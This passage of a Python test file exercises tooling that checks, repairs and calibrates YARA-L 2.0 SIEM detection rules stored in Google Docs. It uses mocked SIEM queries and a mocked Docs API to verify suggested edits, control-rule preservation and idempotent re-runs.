    validated_rules: list[str] = []

    def fake_validate(rule_text: str) -> str:
        validated_rules.append(rule_text)
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if 'target.resource.name = "projects/base-analytics"' in query:
            return {"events": [], "total_events": 0}
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {
                                "resource": {"name": "projects/base-production"}
                            },
                        }
                    }
                    for _ in range(5)
                ],
                "total_events": 5,
            }
        if "WORKSPACE_ACTIVITY" in query:
            return {"events": [], "total_events": 0}
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_yaral2_rule(
        zero_hit_non_existence_rule,
        siem_search_fn=fake_search,
        siem_validate_fn=fake_validate,
    )
    assert diag["status"] == "success"
    assert diag["zero_hit"] is True
    assert diag["is_multi_event"] is True
    assert diag["diagnosis_class"] == "value_format_mismatch"
    assert diag["failing_event_var"] == "$iam"
    assert diag["failing_predicate_index"] == 1
    assert diag["recommended_span_target"] == "predicate"
    assert (
        diag["recommended_span_replacement"]
        == '$iam.target.resource.name = "projects/base-production"'
    )
    assert (
        diag["recommended_yaral2_predicate"]
        == '$iam.target.resource.name = "projects/base-production"'
    )
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["pivot_event_count"] == 5
    assert diag["shared_join_values"] == ["104.198.226.161"]
    assert (
        '$iam.target.resource.name = "projects/base-production"'
        in diag["pivoted_rule_text"]
    )
    assert any(
        '$iam.target.resource.name = "projects/base-production"' in r
        for r in validated_rules
    )


def test_verify_and_redline_yaral2_rules_in_doc_stages_outcome_and_non_existence_edits_idempotently() -> None:
    """End-to-end mock Google Docs test verifying descending-index writeMode="SUGGEST" edits,
    combined static outcome/condition repairs + zero-hit positive stream pivot, valid control
    preservation, and Pass 2 idempotency (skipped_existing_suggestion_count)."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        clear_doc_index_cache,
        find_yaral2_rule_spans,
        verify_and_redline_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()

    doc_text = (
        "# Cycle 9 H16 YARA-L 2.0 Outcome & Non-Existence Runbook\n\n"
        "rule gcp_iam_unapproved_privilege_escalation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.target.resource.name = "projects/base-analytics"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $risk_score = avg(85)\n"
        "    $event_count = distinct_count($iam.metadata.id)\n"
        "    $target_resources = $iam.resource.name\n"
        "  condition:\n"
        "    $iam and not $approval and $hit_count >= 1\n"
        "}\n\n"
        "rule gcp_iam_verified_non_existence_baseline {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.target.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $risk_score = max(85)\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        "    $target_resources = array_distinct($iam.target.resource.name)\n"
        "  condition:\n"
        "    $iam and !$approval and $event_count >= 1 and $risk_score >= 50\n"
        "}\n"
    )

    mock_doc = {
        "documentId": "doc-h16-outcome-non-existence",
        "title": "Cycle 9 H16 Outcome & Non-Existence Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h16-{i}"}}
                        for i, _ in enumerate(payload["requests"])
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if 'target.resource.name = "projects/base-analytics"' in query:
            return {"events": [], "total_events": 0}
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {
                                "resource": {"name": "projects/base-production"}
                            },
                        }
                    }
                    for _ in range(5)
                ],
                "total_events": 5,
            }
        if "WORKSPACE_ACTIVITY" in query:
            return {"events": [], "total_events": 0}
        return {"events": [], "total_events": 0}

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-h16-outcome-non-existence",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    # 5 static outcome/condition findings + 1 zero-hit predicate finding on Rule 1 = 6 total
    assert res["yaral2_findings_count"] == 6
    assert res["zero_hit_yaral2_findings_count"] == 1
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 6
    assert res["edits"]["applied_count"] == 6

    # Control rule must have 0 findings
    finding_rules = {f["rule_name"] for f in res["findings"]}
    assert "gcp_iam_verified_non_existence_baseline" not in finding_rules

    # Verify descending-index writeMode="SUGGEST" execution order
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Apply staged edits in descending order and verify accepted_text has 0 defects
    accepted_text = doc_text
    for f in sorted(
        res["findings"], key=lambda item: int(item["start_index"]), reverse=True
    ):
        s_idx = int(f["start_index"]) - 1
        e_idx = int(f["end_index"]) - 1
        assert accepted_text[s_idx:e_idx] == f["quote"]
        accepted_text = (
            accepted_text[:s_idx] + str(f["replacement"]) + accepted_text[e_idx:]
        )
    _, _, remaining_findings = find_yaral2_rule_spans(
        accepted_text, _build_utf16_index_map(accepted_text)
    )
    assert remaining_findings == []
    assert '$iam.target.resource.name = "projects/base-production"' in accepted_text
    assert "$target_resources = array_distinct($iam.target.resource.name)" in accepted_text
    assert "$iam and !$approval and $event_count >= 1" in accepted_text

    # Pass 2 idempotency
    mock_doc_pending = {
        "documentId": "doc-h16-outcome-non-existence",
        "title": "Cycle 9 H16 Outcome & Non-Existence Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": [
                                        "suggest.yl2.h16.existing"
                                    ],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-h16-outcome-non-existence",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pending)
        ),
    )
    assert res2["status"] == "success"
    assert res2["yaral2_findings_count"] == 0
    assert res2["zero_hit_yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 6
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


def test_extract_yaral2_event_predicates_and_spec_parse_cidr_conditionals_and_outcome_thresholds() -> None:
    """Verifies extraction of net.ip_in_range_cidr/cidrmatch predicates, outcome CASE WHEN/iff/if
    conditional expressions, and condition outcome threshold comparisons with exact 1-based UTF-16 spans."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        _iter_yaral2_rule_blocks,
        extract_yaral2_event_predicates,
        extract_yaral2_multi_event_spec,
    )

    doc_text = (
        "Cycle 10 H17 Parser Test:\n\n"
        "rule gcp_iam_cidr_and_conditional_outcome_case_33278 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    cidrmatch("104.198.226.0/24", $iam.ip)\n'
        "    $iam.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        '    $risk_score = CASE WHEN $iam.resource.name = "projects/base-production" THEN 85 ELSE 40 END\n'
        "  condition:\n"
        "    $iam and $event_count >= 5 and $risk_score >= 95\n"
        "}\n\n"
        'rule collapsed_cidr_rule { meta: author = "SOC" events: '
        '$e.metadata.log_type = "GCP_CLOUDAUDIT" '
        'net.ip_in_range_cidr($e.principal.ip, "104.198.226.0/24") '
        'outcome: $risk_score = iff($e.target.resource.name = "projects/base-production", 85, 40) '
        "condition: $e and $risk_score > 70 }\n"
    )
    index_map = _build_utf16_index_map(doc_text)
    blocks = _iter_yaral2_rule_blocks(doc_text)
    assert len(blocks) == 2

    b0 = blocks[0]
    preds0 = extract_yaral2_event_predicates(
        b0["rule_text"],
        rule_char_start=b0["char_start"],
        full_plain_text=doc_text,
        index_map=index_map,
    )
    cidr_preds0 = [p for p in preds0 if p["predicate_kind"] == "cidr"]
    assert len(cidr_preds0) == 1
    cp0 = cidr_preds0[0]
    assert cp0["cidr_function"] == "cidrmatch"
    assert cp0["operator"] == "net.ip_in_range_cidr"
    assert cp0["cidr_arg_order"] == "cidr_first"
    assert cp0["event_var"] == "$iam"
    assert cp0["field_token"] == "ip"
    assert cp0["canonical_field"] == "principal.ip"
    assert cp0["cidr_value"] == "104.198.226.0/24"
    assert cp0["udm_clause"] == 'net.ip_in_range_cidr(principal.ip, "104.198.226.0/24")'
    s0 = cp0["predicate_start_index"] - 1
    e0 = cp0["predicate_end_index"] - 1
    assert doc_text[s0:e0] == 'cidrmatch("104.198.226.0/24", $iam.ip)'

    spec0 = extract_yaral2_multi_event_spec(
        b0["rule_text"],
        rule_char_start=b0["char_start"],
        full_plain_text=doc_text,
        index_map=index_map,
    )
    assert len(spec0["outcome_conditionals"]) == 1
    oc0 = spec0["outcome_conditionals"][0]
    assert oc0["conditional_kind"] == "case_when"
    assert oc0["true_value"] == 85
    assert oc0["false_value"] == 40
    assert (
        oc0["canonical_if_expr"]
        == 'if($iam.target.resource.name = "projects/base-production", 85, 40)'
    )
    assert len(spec0["condition_outcome_comparisons"]) == 2
    cmp_ec = spec0["condition_outcome_comparisons"][0]
    assert cmp_ec["outcome_var"] == "$event_count"
    assert cmp_ec["outcome_var_name"] == "event_count"
    assert cmp_ec["operator"] == ">="
    assert cmp_ec["threshold_value"] == 5
    c_s0 = cmp_ec["comparison_start_index"] - 1
    c_e0 = cmp_ec["comparison_end_index"] - 1
    assert doc_text[c_s0:c_e0] == "$event_count >= 5"

    cmp_rs = spec0["condition_outcome_comparisons"][1]
    assert cmp_rs["outcome_var"] == "$risk_score"
    assert cmp_rs["outcome_var_name"] == "risk_score"
    assert cmp_rs["operator"] == ">="
    assert cmp_rs["threshold_value"] == 95
    c_s1 = cmp_rs["comparison_start_index"] - 1
    c_e1 = cmp_rs["comparison_end_index"] - 1
    assert doc_text[c_s1:c_e1] == "$risk_score >= 95"

    b1 = blocks[1]
    preds1 = extract_yaral2_event_predicates(
        b1["rule_text"],
        rule_char_start=b1["char_start"],
        full_plain_text=doc_text,
        index_map=index_map,
    )
    cidr_preds1 = [p for p in preds1 if p["predicate_kind"] == "cidr"]
    assert len(cidr_preds1) == 1
    assert cidr_preds1[0]["cidr_function"] == "net.ip_in_range_cidr"
    assert cidr_preds1[0]["cidr_arg_order"] == "field_first"
    spec1 = extract_yaral2_multi_event_spec(
        b1["rule_text"],
        rule_char_start=b1["char_start"],
        full_plain_text=doc_text,
        index_map=index_map,
    )
    assert len(spec1["outcome_conditionals"]) == 1
    assert spec1["outcome_conditionals"][0]["conditional_kind"] == "iff"
    assert len(spec1["condition_outcome_comparisons"]) == 1
    assert spec1["condition_outcome_comparisons"][0]["outcome_var"] == "$risk_score"
    assert spec1["condition_outcome_comparisons"][0]["threshold_value"] == 70


def test_find_yaral2_rule_spans_repairs_cidr_functions_and_outcome_conditionals_without_overlap() -> None:
    """Verifies static span detection and non-overlapping 1-based UTF-16 repair for
    invalid_cidr_function_syntax and invalid_outcome_conditional_syntax, while preserving
    valid net.ip_in_range_cidr() and if() expressions with 0 false positives."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        "Rule 1 (Defective CIDR + CASE WHEN in match rule):\n"
        "rule gcp_iam_cidr_and_conditional_outcome_case_33278 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    cidrmatch("104.198.226.0/24", $iam.ip)\n'
        "    $iam.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        '    $risk_score = CASE WHEN $iam.resource.name = "projects/base-production" THEN 85 ELSE 40 END\n'
        "  condition:\n"
        "    $iam and $event_count >= 1 and $risk_score >= 50\n"
        "}\n\n"
        "Rule 2 (Defective ipv4_is_in_range + iff in single-event rule):\n"
        "rule single_event_iff_and_ipv4_range {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    ipv4_is_in_range($iam.principal.ip, "104.198.226.0/24")\n'
        "  outcome:\n"
        '    $risk_score = iff($iam.target.resource.name = "projects/base-production", 85, 40)\n'
        "  condition:\n"
        "    $iam and $risk_score >= 50\n"
        "}\n\n"
        "Rule 3 (Valid control rule):\n"
        "rule gcp_iam_calibrated_outcome_control {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    net.ip_in_range_cidr($iam.principal.ip, "104.198.226.0/24")\n'
        "    $iam.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        '    $risk_score = max(if($iam.target.resource.name = "projects/base-production", 85, 40))\n'
        "  condition:\n"
        "    $iam and $event_count >= 1 and $risk_score >= 50\n"
        "}\n"
    )
    index_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, index_map)
    assert len(findings) == 4
    assert len(comments) == 4
    assert len(edits) == 4

    # Control rule must have 0 findings
    assert "gcp_iam_calibrated_outcome_control" not in {
        f["rule_name"] for f in findings
    }

    r1_findings = [
        f
        for f in findings
        if f["rule_name"] == "gcp_iam_cidr_and_conditional_outcome_case_33278"
    ]
    assert [f["defect_type"] for f in r1_findings] == [
        "invalid_cidr_function_syntax",
        "invalid_outcome_conditional_syntax",
    ]
    assert (
        r1_findings[0]["replacement"]
        == 'net.ip_in_range_cidr($iam.principal.ip, "104.198.226.0/24")'
    )
    assert (
        r1_findings[1]["replacement"]
        == 'max(if($iam.target.resource.name = "projects/base-production", 85, 40))'
    )

    r2_findings = [
        f
        for f in findings
        if f["rule_name"] == "single_event_iff_and_ipv4_range"
    ]
    assert [f["defect_type"] for f in r2_findings] == [
        "invalid_cidr_function_syntax",
        "invalid_outcome_conditional_syntax",
    ]
    assert (
        r2_findings[0]["replacement"]
        == 'net.ip_in_range_cidr($iam.principal.ip, "104.198.226.0/24")'
    )
    assert (
        r2_findings[1]["replacement"]
        == 'if($iam.target.resource.name = "projects/base-production", 85, 40)'
    )

    # Apply edits in descending start_index order and confirm 0 remaining findings
    repaired_doc = doc_text
    for f in sorted(findings, key=lambda x: int(x["start_index"]), reverse=True):
        s_idx = int(f["start_index"]) - 1
        e_idx = int(f["end_index"]) - 1
        assert repaired_doc[s_idx:e_idx] == f["quote"]
        repaired_doc = repaired_doc[:s_idx] + str(f["replacement"]) + repaired_doc[e_idx:]

    _, _, remaining = find_yaral2_rule_spans(
        repaired_doc, _build_utf16_index_map(repaired_doc)
    )
    assert remaining == []


def test_evaluate_yaral2_outcome_thresholds_computes_empirical_aggregations_and_detects_suppression() -> None:
    """Verifies that evaluate_yaral2_outcome_thresholds computes count_distinct, count, max, min,
    sum, and nested if() conditional expressions against matched SIEM UDM events and identifies
    suppressing condition outcome thresholds."""
    from manager.tools.docs_review_tools import evaluate_yaral2_outcome_thresholds

    rule_text = (
        "rule gcp_iam_outcome_threshold_test {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    net.ip_in_range_cidr($iam.principal.ip, "104.198.226.0/24")\n'
        "    $iam.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        '    $risk_score = max(if($iam.target.resource.name = "projects/base-production", 85, 40))\n'
        "  condition:\n"
        "    $iam and $event_count >= 5 and $risk_score >= 95\n"
        "}"
    )
    sample_events = [
        {
            "udm": {
                "metadata": {"id": "evt-33278-1", "log_type": "GCP_CLOUDAUDIT"},
                "principal": {"ip": ["104.198.226.161"]},
                "target": {"resource": {"name": "projects/base-production"}},
            }
        }
    ]
    eval_res = evaluate_yaral2_outcome_thresholds(
        rule_text,
        sample_events,
    )
    assert eval_res["events_matched"] == 1
    assert eval_res["outcome_values"]["$event_count"] == 1
    assert eval_res["outcome_values"]["$risk_score"] == 85
    assert eval_res["all_thresholds_satisfied"] is False
    assert eval_res["threshold_suppressed"] is True
    assert eval_res["effective_detections"] == 0
    assert len(eval_res["uncalibrated_comparisons"]) == 2
    assert (
        eval_res["uncalibrated_comparisons"][0]["recommended_comparison"]
        == "$event_count >= 1"
    )
    assert (
        eval_res["uncalibrated_comparisons"][1]["recommended_comparison"]
        == "$risk_score >= 85"
    )
    assert "$event_count >= 1 and $risk_score >= 85" in eval_res["calibrated_rule_text"]


def test_diagnose_zero_hit_yaral2_rule_calibrates_suppressing_outcome_thresholds() -> None:
    """Verifies that diagnose_zero_hit_yaral2_rule detects uncalibrated_outcome_threshold
    on both single-event and multi-event YARA-L 2.0 rules when events match > 0 telemetry
    but condition outcome thresholds suppress all detections."""
    from manager.tools.docs_review_tools import (
        diagnose_zero_hit_yaral2_rule,
        verify_yaral2_rule_with_siem,
    )

    multi_rule = (
        "rule wins_d19_multi_event_uncalibrated_threshold_case_33280 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $cmd.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd\\.exe.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        '    $svc.metadata.event_type = "PROCESS_LAUNCH"\n'
        "    re.regex($svc.target.process.command_line, `.*services\\.exe.*`) nocase\n"
        "    $svc.principal.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  outcome:\n"
        "    $cmd_count = count_distinct($cmd.metadata.id)\n"
        "    $svc_count = count_distinct($svc.metadata.id)\n"
        "  condition:\n"
        "    $cmd and $svc and $svc_count >= 3\n"
        "}"
    )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "services\\.exe" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"id": "svc-1", "event_type": "PROCESS_LAUNCH"},
                            "principal": {"hostname": "wins-d19"},
                            "target": {"process": {"command_line": "C:\\Windows\\System32\\services.exe"}},
                        }
                    }
                ],
                "total_events": 1,
            }
        return {
            "events": [
                {
                    "udm": {
                        "metadata": {"id": f"cmd-{i}", "event_type": "PROCESS_LAUNCH"},
                        "principal": {"hostname": "wins-d19"},
                        "target": {"process": {"command_line": "cmd.exe /c whoami"}},
                    }
                }
                for i in range(6)
            ],
            "total_events": 6,
        }

    diag = diagnose_zero_hit_yaral2_rule(
        multi_rule,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert diag["status"] == "success"
    assert diag["is_multi_event"] is True
    assert diag["initial_event_count"] == 7
    assert diag["failure_reason"] == "uncalibrated_outcome_threshold"
    assert diag["failing_predicate"]["comparison_text"] == "$svc_count >= 3"
    assert diag["recommended_yaral2_predicate"] == "$svc_count >= 1"
    assert diag["recommended_span_target"] == "condition_outcome_comparison"
    assert diag["recommended_span_replacement"] == "$svc_count >= 1"
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["pivot_event_count"] == 7
    assert "$cmd and $svc and $svc_count >= 1" in diag["pivoted_rule_text"]

    siem_check = verify_yaral2_rule_with_siem(
        multi_rule,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert siem_check["compiler_verified"] is True
    assert siem_check["retrohunt_event_count"] == 7
    assert siem_check["outcome_evaluation"]["all_thresholds_satisfied"] is False
    assert (
        siem_check["zero_hit_diagnosis"]["failure_reason"]
        == "uncalibrated_outcome_threshold"
    )


def test_verify_and_redline_yaral2_rules_in_doc_stages_cidr_conditional_and_threshold_calibration_idempotently() -> None:
    """End-to-end mock Google Docs test verifying combined static (cidrmatch, CASE WHEN) and
    live SIEM uncalibrated_outcome_threshold red-lining in descending startIndex order under
    writeMode='SUGGEST', control rule preservation, and Pass 2 suggestion idempotency."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        clear_doc_index_cache,
        find_yaral2_rule_spans,
        verify_and_redline_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()

    doc_text = (
        "Cycle 10 H17 End-to-End Test:\n\n"
        "1. Single-event CIDR + CASE WHEN + uncalibrated outcome thresholds:\n"
        "rule gcp_iam_cidr_and_conditional_outcome_case_33278 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    cidrmatch("104.198.226.0/24", $iam.ip)\n'
        "    $iam.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        '    $risk_score = CASE WHEN $iam.resource.name = "projects/base-production" THEN 85 ELSE 40 END\n'
        "  condition:\n"
        "    $iam and $event_count >= 5 and $risk_score >= 95\n"
        "}\n\n"
        "2. Multi-event uncalibrated outcome threshold:\n"
        "rule wins_d19_multi_event_uncalibrated_threshold_case_33280 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $cmd.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd\\.exe.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        '    $svc.metadata.event_type = "PROCESS_LAUNCH"\n'
        "    re.regex($svc.target.process.command_line, `.*services\\.exe.*`) nocase\n"
        "    $svc.principal.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  outcome:\n"
        "    $cmd_count = count_distinct($cmd.metadata.id)\n"
        "    $svc_count = count_distinct($svc.metadata.id)\n"
        "  condition:\n"
        "    $cmd and $svc and $svc_count >= 3\n"
        "}\n\n"
        "3. Calibrated control rule:\n"
        "rule gcp_iam_calibrated_outcome_control {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    net.ip_in_range_cidr($iam.principal.ip, "104.198.226.0/24")\n'
        "    $iam.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        '    $risk_score = max(if($iam.target.resource.name = "projects/base-production", 85, 40))\n'
        "  condition:\n"
        "    $iam and $event_count >= 1 and $risk_score >= 50\n"
        "}\n"
    )

    mock_doc = {
        "documentId": "doc-h17-outcome-calibration",
        "title": "Cycle 10 H17 Outcome Calibration & Functions Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h17-{i}"}}
                        for i, _ in enumerate(payload["requests"])
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"id": "iam-33278-1", "log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                ],
                "total_events": 1,
            }
        if "services\\.exe" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"id": "svc-1", "event_type": "PROCESS_LAUNCH"},
                            "principal": {"hostname": "wins-d19"},
                            "target": {"process": {"command_line": "C:\\Windows\\System32\\services.exe"}},
                        }
                    }
                ],
                "total_events": 1,
            }
        if "cmd\\.exe" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"id": f"cmd-{i}", "event_type": "PROCESS_LAUNCH"},
                            "principal": {"hostname": "wins-d19"},
                            "target": {"process": {"command_line": "cmd.exe /c whoami"}},
                        }
                    }
                    for i in range(6)
                ],
                "total_events": 6,
            }
        return {"events": [], "total_events": 0}

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-h17-outcome-calibration",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    # Rule 1: 2 static findings (cidrmatch, CASE WHEN) + 2 uncalibrated outcome threshold findings ($event_count >= 5, $risk_score >= 95)
    # Rule 2: 1 uncalibrated outcome threshold finding ($svc_count >= 3)
    # Rule 3: 0 findings
    assert res["yaral2_findings_count"] == 5
    assert res["zero_hit_yaral2_findings_count"] == 3
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 5
    assert res["edits"]["applied_count"] == 5

    # Control rule must have 0 findings
    assert "gcp_iam_calibrated_outcome_control" not in {
        f["rule_name"] for f in res["findings"]
    }

    # Verify descending-index writeMode="SUGGEST" execution order
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Apply staged edits in descending order and verify accepted_text has 0 defects and calibrated thresholds
    accepted_text = doc_text
    for f in sorted(
        res["findings"], key=lambda item: int(item["start_index"]), reverse=True
    ):
        s_idx = int(f["start_index"]) - 1
        e_idx = int(f["end_index"]) - 1
        assert accepted_text[s_idx:e_idx] == f["quote"]
        accepted_text = (
            accepted_text[:s_idx] + str(f["replacement"]) + accepted_text[e_idx:]
        )
    _, _, remaining_findings = find_yaral2_rule_spans(
        accepted_text, _build_utf16_index_map(accepted_text)
    )
    assert remaining_findings == []
    assert 'net.ip_in_range_cidr($iam.principal.ip, "104.198.226.0/24")' in accepted_text
    assert 'max(if($iam.target.resource.name = "projects/base-production", 85, 40))' in accepted_text
    assert "$iam and $event_count >= 1 and $risk_score >= 85" in accepted_text
    assert "$cmd and $svc and $svc_count >= 1" in accepted_text

    # Pass 2 idempotency
    mock_doc_pending = {
        "documentId": "doc-h17-outcome-calibration",
        "title": "Cycle 10 H17 Outcome Calibration & Functions Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": [
                                        "suggest.yl2.h17.existing"
                                    ],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-h17-outcome-calibration",
